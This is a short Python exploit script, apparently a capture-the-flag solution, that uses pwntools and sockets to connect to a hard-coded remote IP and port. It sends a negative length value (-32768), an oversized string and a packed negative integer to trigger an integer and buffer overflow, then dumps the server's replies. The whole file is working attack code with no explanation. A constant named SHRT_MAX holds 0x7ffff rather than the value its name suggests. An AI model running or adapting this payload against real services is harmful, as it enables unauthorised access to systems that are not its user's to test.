from pwn import *
import socket, sys

HOST, PORT = '200.136.213.126', 1988
# HOST, PORT = '0.0.0.0', 31337
r = socket.create_connection((HOST, PORT))
SHRT_MAX = 0x7ffff
def make(in_, sub, n):
	r.recv(1024)
	r.send('-32768\n')
	r.recv(1024)
	r.send(in_ + '\n')
	r.recv(1024)
	r.send(sub + p32(n) + '\n')

make('a', 'a' * SHRT_MAX + 'a', (-SHRT_MAX - 1 & 0xffffffff))
while True:
	try:
		c = r.recv(1)
	except:
		break
	if c == '':
		break
	sys.stdout.write(c)